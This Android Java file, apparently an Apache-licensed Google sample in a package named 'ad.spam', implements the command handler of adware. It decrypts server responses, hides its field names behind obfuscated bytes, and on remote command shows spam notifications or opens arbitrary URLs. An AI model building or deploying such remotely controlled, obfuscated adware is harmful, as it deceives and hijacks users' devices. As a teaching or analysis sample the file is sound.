// Copyright 2021 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package ad.spam;

import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.util.Base64;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;

import org.json.JSONException;
import org.json.JSONObject;

public class CmdProcessor {

    private final String PARAM_CMD = NativeAdapter.transform(new byte[]{0x00, 0x2b, 0x31});
    private final String PARAM_DATA = NativeAdapter.transform(new byte[]{0x07, 0x27, 0x21, 0x06});

    private final int CMD_ERROR = -1;
    private final int CMD_DO_NOTHING = 0;
    private final int CMD_SHOW_NOTIFICATION = 1;
    private final int CMD_OPEN_URL = 2;

    private final Context context;
    NotificationManagerCompat notificationManager;

    public CmdProcessor(Context context, NotificationManagerCompat notificationManager) {
        this.context = context;
        this.notificationManager = notificationManager;
    }

    private void showNotification(String text) {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(
                context, MainActivity.CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_stat_name)
                .setContentTitle("You might be interested in...")
                .setContentText(text)
                .setPriority(NotificationCompat.PRIORITY_DEFAULT);

        notificationManager.notify(0, builder.build());
    }

    private void showToast(String text) {
        Toast toast = Toast.makeText(context, text, Toast.LENGTH_LONG);
        toast.show();
    }

    private void openUrl(String url) {
        Intent intent =
                new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    public void processResponse(String response) throws JSONException, IllegalArgumentException {
        if (response == null) {
            return;
        }
        byte[] decoded = Base64.decode(response, Base64.DEFAULT);
        String decrypted = new String(NativeAdapter.decrypt(decoded));

        JSONObject packet = new JSONObject(decrypted);
        int cmd = packet.getInt(PARAM_CMD);
        String data = packet.getString(PARAM_DATA);
        switch (cmd) {
            case CMD_ERROR:
                showToast(data);
                break;
            case CMD_DO_NOTHING:
                break;
            case CMD_SHOW_NOTIFICATION:
                showNotification(data);
                break;
            case CMD_OPEN_URL:
                openUrl(data);
                break;
        }
    }
}
